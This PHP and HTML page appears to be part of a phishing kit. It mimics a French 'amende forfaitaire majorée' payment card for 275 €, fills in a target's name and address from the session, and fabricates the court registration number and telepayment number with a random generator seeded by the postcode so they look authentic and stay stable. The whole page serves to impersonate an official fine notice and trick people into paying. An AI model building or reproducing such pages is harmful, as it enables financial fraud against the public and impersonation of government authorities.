<?php
session_start();
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="UTF-8" />
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <style type="text/css">
         body {
         font-family: "Times New Roman", Times, serif;
         max-width: 1000px;
         margin: 20px auto;
         padding: 20px;
         }
         .container {
         display: flex;
         justify-content: space-between;
         }
         .left-section {
         flex: 1;
         }
         .right-section {
         flex: 1;
         margin: 0 auto; /* Center the right section content */
         }
         .title {
         font-size: 20px;
         font-weight: bold;
         margin-top: 20px;
         }
         .payment-box {
         border: 2px solid black;
         width: 80%;
         margin-bottom: 15px;
         }
         .payment-header {
         background: white;
         border-bottom: 2px solid black;
         padding: 8px 10px;
         }
         .payment-header-text {
         font-size: 24px;  /* Increased font size */
         font-weight: bold;
         }
         .payment-content {
         padding: 10px;
         }
         .amount {
         font-size: 16px;
         }
         .reduction-notice {
         font-size: 12px;
         margin: 5px 0;
         }
         .reduced-amount {
         font-weight: bold;
         font-size: 16px;
         }
         .reference {
         font-size: 12px;
         margin: 5px 0;
         width: 80%; /* Align with payment box width */
         }
         .qr-code {
         width: 100px;
         height: 100px;
         background: #000;
         margin: 15px 0;
         }
         .right-section {
         position: relative;
         }
         .scissors {
         position: absolute;
         top: 0;
         left: 400px; /* Changed from right: 0 to left: -20px */
         }
         .barcode-section {
         width: 100%;
         }
         .barcode {
         width: 100%;
         height: 40px;
         padding-top: 8px;
         }
         .address {
         font-family: "Times New Roman", Times, serif;
         margin: 20px auto; /* Center the address */
         width: 90%;
         }
         .ref-number {
         font-family: "Times New Roman", Times, serif;
         letter-spacing: 2px;
         margin: 20px auto; /* Center the reference number */
         font-size: 14px;
         width: 90%;
         text-align: center;
         }
         .footer-line {
         border-top: 1px solid black;
         margin-top: 20px;
         padding-top: 10px;
         font-size: 12px;
         text-align: center;
         }
         .right-content {
         width: 90%;
         margin: 0 auto;
         }

         .censored {
            font-size: 20px;
            text-transform: uppercase;
         }
      </style>
   </head>
   <body>
      <div class="container">
         <div class="left-section">
            <div class="title"><span style="font-size:28px;">CARTE DE PAIEMENT</span></div>
            <div class="title"><span style="font-size:26px;">​</span><strong style="font-size: 13px;"><span style="font-size:22px;">Amende forfaitaire major&eacute;e</span></strong></div>
            <div class="payment-box">
               <div class="payment-header">
                  <div class="payment-header-text">Somme &agrave; payer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 275,00 &euro;</div>
               </div>
               <div class="payment-content">
                  <div class="amount"><span style="font-size:18px;">Si les conditions de la diminution de 20% sont</span></div>
                  <p class="reduction-notice"><span style="font-size:18px;">respect&eacute;es, la somme &agrave; payer est ramen&eacute;e &agrave; :</span></p>
                  <div class="reduced-amount"><span style="font-size:28px;">235,00 &euro; au lieu de 275,00 &euro;</span></div>
               </div>
            </div>
            <div class="reference"><span style="font-size:18px;">D&eacute;cision minist&egrave;re public du :  &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <?php echo date('d-m-Y') ?> <br />
               N&deg; d&#39;enregistrement au greffe :&nbsp; &nbsp;<?php 
            $seed = (int)$_SESSION['zip'] ; // You can change this to any constant value
            mt_srand($seed);
               // Generate two random numbers with specific lengths
               $firstPart = mt_rand(10000000, 99999999);  // 8-digit number
               $secondPart = mt_rand(100000000, 999999999);  // 9-digit number
               
               // Concatenate them with a space in between
               $finalNumber = $firstPart . ' ' . $secondPart;
               
               echo $finalNumber;
                           
               ?></span>
            </div>
            <div class="qr-code"><img src="./styles/images/qr.png" width="310" /></div>
         </div>
         <div class="right-section">
            <div class="scissors">
               <img width="150" src="./styles/images/cissors.png">
            </div>
            <div class="right-content">

               <div class="censored">&nbsp;</div>
              
               <div class="censored"><?php
                  if (isset($_SESSION['fname'])) {
                      echo htmlspecialchars($_SESSION['fname']);
                  }
                  
                  ?></div>
               <div class="censored"><?php
                  if (isset($_SESSION['add'])) {
                      echo htmlspecialchars($_SESSION['add']);
                  }
                  
                  ?></div>
               <div class="censored"><?php
                  if (isset($_SESSION['zip']) && isset($_SESSION['city'])) {
                      echo htmlspecialchars($_SESSION['zip']) . " " . htmlspecialchars($_SESSION['city']);
                  }
                  
                  ?></div>
               <div class="title"><span style="font-size:24px;">Carte de paiement</span></div>
               <div class="barcode-section">
                  <div class="barcode"><img src="./styles/images/bar.png" width="400" /></div>
                  <div style="font-size:20px;">Num&eacute;ro de t&eacute;l&eacute;paiement : <span class=""><?php
                        // Set a fixed seed to ensure the same output on page refresh
                        $seed = (int)$_SESSION['zip'] ; // You can change this to any constant value
                        mt_srand($seed);

                        // Generate the individual groups of numbers
                        $part1 = mt_rand(1000, 9999);       // 4-digit number
                        $part2 = mt_rand(1000, 9999);       // 4-digit number
                        $part3 = mt_rand(1000, 9999);       // 4-digit number
                        $part4 = mt_rand(100, 999);         // 3-digit number
                        $part5 = mt_rand(10, 99);           // 2-digit number

                        // Concatenate them with spaces
                        $finalNumber = $part1 . ' ' . $part2 . ' ' . $part3 . ' ' . $part4 . ' ' . $part5;

                        echo $finalNumber;
                        ?>
            </span></div>
               </div>
               <div class="address" style="margin-left: 40px;">&nbsp;</div>
               <div class="address" style="margin-left: 40px;">
                  <img width="300" src="./styles/images/centre.png">
               </div>
            </div>
         </div>
      </div>
      <div class="footer-line">&nbsp;</div>
      <p style="text-align: center;">
         <img width="700" src="./styles/images/code.png">
      </p>
   </body>
</html>